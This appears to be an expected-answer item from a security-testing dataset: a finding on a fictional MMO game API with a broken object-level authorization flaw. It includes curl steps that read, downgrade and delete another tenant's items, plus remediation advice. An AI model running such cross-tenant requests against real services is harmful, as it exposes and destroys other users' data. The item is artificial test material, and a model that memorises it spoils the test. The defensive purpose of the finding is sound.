# Expected Response

## System
- System: RealmForge Game API v3.3.0
- Domain: GAMING / MMO BACKEND
- Example ID: BOLA-0082
- Risk ID: RISK-43-082

## Findings

### 1. Pattern 4.3 — Integrity Downgrade via Versioning: Cross-Tenant Game Item Access on `/api/v1/items/:id` (HAR Primary)

The `GET/PATCH/DELETE /api/v1/items/:id` endpoint queries by `item_id` only, without filtering by `owner_id` or `tenant_id`. An attacker from `ORG-3B50` can:

1. **Read** another player's game items (virtual property theft — HAR primary).
2. **Downgrade via PATCH:** Modify another player's item `status` or `sensitive_data` to a lower tier/version, degrading the integrity of their in-game equipment (Pattern 4.3 core).
3. **Delete** another player's items, causing irreversible loss of virtual property.

Pattern 4.3 "integrity downgrade via versioning" in the Gaming/MMO context: the attacker exploits the missing ownership check to roll back or degrade a victim player's item version/status (e.g., legendary → common tier), directly sabotaging their competitive standing and destroying virtual economy assets.

**Evidence from HAR:**
- Request: `GET /api/v1/items/ITE-2082` from `ORG-3B50`
- Response `tenantId: "ORG-066C"` — cross-tenant access confirmed
- Response `sensitiveData: "CONFIDENTIAL: cross-tenant data for ORG-066C"` — game item data exposed
- HTTP status: 200 — no authorization failure

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.realmforge-game.example.com/api/v1/items/ITE-1082" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
  -H "X-Tenant-ID: ORG-3B50"
```
**Expected:** Returns own record with `tenantId: "ORG-3B50"`.

**Step 2 — Cross-tenant game item read (primary HAR attack):**
```bash
curl -s "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
  -H "X-Tenant-ID: ORG-3B50"
```
**Vulnerable outcome:** Returns `tenantId: "ORG-066C"` and victim's game item `sensitiveData` — virtual property exposure.

**Step 3 — Integrity downgrade: degrade victim's game item to lower version/tier (Pattern 4.3 primary):**
```bash
curl -s -X PATCH "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
  -H "X-Tenant-ID: ORG-3B50" \
  -H "Content-Type: application/json" \
  -d '{"status": "deprecated", "sensitive_data": "tier_downgraded_to_common_by_attacker"}'
```
**Vulnerable outcome:** Victim's legendary/rare item degraded to `deprecated` status — integrity downgrade confirmed. In an MMO economy, this constitutes economic sabotage of the victim's virtual property.

**Step 4 — Cross-tenant game item delete (irreversible property destruction):**
```bash
curl -s -X DELETE "https://api.realmforge-game.example.com/api/v1/items/ITE-2082" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3B50>" \
  -H "X-Tenant-ID: ORG-3B50"
```
**Vulnerable outcome:** Victim's game item permanently deleted — virtual property loss.

## Secure Outcome
```json
{ "error": "Forbidden", "code": 403 }
```

## Remediation
- Add `WHERE item_id = $id AND owner_id = $jwtSub AND tenant_id = $jwtTenantId` to all item queries (RISK-43-082).
- Centralize authorization middleware: never resolve IDs without ownership check.
- Use non-sequential UUIDs for item IDs to reduce enumeration risk.
- Add regression test: Tenant A token requests Tenant B item ID — assert 403/404.
